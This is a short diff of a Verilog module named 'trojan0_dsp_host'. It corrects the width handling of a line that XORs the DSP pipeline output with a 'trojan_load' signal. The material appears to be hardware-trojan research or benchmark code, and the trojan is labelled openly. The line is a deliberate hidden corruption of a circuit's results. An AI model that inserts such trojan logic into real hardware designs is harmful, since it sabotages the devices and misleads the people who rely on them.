@@ -87,8 +87,8 @@ module trojan0_dsp_host #(
             dsp_out <= {DATA_WIDTH*2{1'b0}};
             result_valid <= 1'b0;
         end else begin
-            // Mix DSP result with trojan load
-            dsp_out <= pipeline[PIPELINE_STAGES-1] ^ {{DATA_WIDTH*2-64{1'b0}}, trojan_load};
+            // Mix DSP result with trojan load (safe width handling)
+            dsp_out <= pipeline[PIPELINE_STAGES-1] ^ trojan_load[DATA_WIDTH*2-1:0];
             result_valid <= valid_pipeline[PIPELINE_STAGES-1];
         end
     end
